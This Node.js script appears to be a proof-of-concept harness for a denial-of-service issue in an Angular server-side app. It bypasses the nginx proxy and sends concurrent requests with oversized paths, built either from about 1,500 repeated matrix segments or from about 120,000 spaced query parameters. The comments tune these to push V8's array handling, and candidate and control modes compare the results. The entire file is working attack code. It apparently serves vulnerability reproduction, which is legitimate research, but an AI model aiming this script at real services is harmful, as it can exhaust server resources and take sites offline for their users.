// Reaches Angular directly on the Compose network. Nginx never sees the request,
// so the only ceiling is Node's own --max-http-header-size.
import http from "node:http";

const target = new URL(process.env.TARGET_URL ?? "http://app:4000");

const MATRIX = Object.freeze({
  candidate: "/a;990;2522",
  control: "/a;aaa;bbbb",
});
// Twenty ordinary backend filters the page always preserves, then whatever the
// attacker appends to the same URL. filterStep is the spacing that keeps V8
// extending one dense elements store instead of giving up on it.
const NOLINKS_BASE = Array.from(
  { length: 20 },
  (_, index) => `filter${index}=value${index}`,
).join("&");
const NOLINKS = Object.freeze({
  candidate: (key) => `${key}=1`,
  control: (key) => `f${key}=`,
});

const shape = process.env.SHAPE ?? "matrix";
if (shape !== "matrix" && shape !== "nolinks") {
  throw new Error(`Unsupported SHAPE=${shape}. Expected "matrix" or "nolinks".`);
}

const mode = process.env.MODE ?? "candidate";
if (mode !== "candidate" && mode !== "control") {
  throw new Error(`Unsupported MODE=${mode}. Expected "candidate" or "control".`);
}

const concurrency = Number(process.env.CONCURRENCY ?? "6");
if (!Number.isSafeInteger(concurrency) || concurrency <= 0) {
  throw new Error(`CONCURRENCY must be a positive integer; received ${process.env.CONCURRENCY}.`);
}

let path;
let detail;

if (shape === "matrix") {
  const segmentsPerRequest = Number(process.env.SEGMENTS ?? "1488");
  if (!Number.isSafeInteger(segmentsPerRequest) || segmentsPerRequest <= 0) {
    throw new Error(`SEGMENTS must be a positive integer; received ${process.env.SEGMENTS}.`);
  }
  path = MATRIX[mode].repeat(segmentsPerRequest);
  detail = { segmentsPerRequest };
} else {
  const filterParams = Number(process.env.PARAMS ?? "120000");
  const filterStep = Number(process.env.STEP ?? "11");
  if (!Number.isSafeInteger(filterParams) || filterParams <= 0) {
    throw new Error(`PARAMS must be a positive integer; received ${process.env.PARAMS}.`);
  }
  if (!Number.isSafeInteger(filterStep) || filterStep <= 0) {
    throw new Error(`STEP must be a positive integer; received ${process.env.STEP}.`);
  }
  const appended = Array.from({ length: filterParams }, (_, index) =>
    NOLINKS[mode](index * filterStep),
  ).join("&");
  path = `/filters?${NOLINKS_BASE}&${appended}`;
  detail = { filterParams, filterStep };
}

const pathBytes = Buffer.byteLength(path);
const agent = new http.Agent({ keepAlive: false, maxSockets: concurrency });

console.log(
  JSON.stringify({
    shape,
    mode,
    transport: "node:http (direct, no proxy)",
    destination: target.origin,
    ...detail,
    concurrency,
    pathBytes,
  }),
);

function sendRequest(index) {
  return new Promise((resolve) => {
    const req = http.request(
      { host: target.hostname, port: target.port, path, method: "GET", agent },
      (res) => {
        let bytes = 0;
        res.on("data", (chunk) => {
          bytes += chunk.length;
        });
        res.on("end", () => resolve({ index, status: res.statusCode, bytes }));
      },
    );
    req.on("error", (error) => resolve({ index, error: error.code ?? error.message }));
    req.end();
  });
}

const results = await Promise.all(
  Array.from({ length: concurrency }, (_, index) => sendRequest(index)),
);

console.log(JSON.stringify({ shape, mode, pathBytes, concurrency, results }));
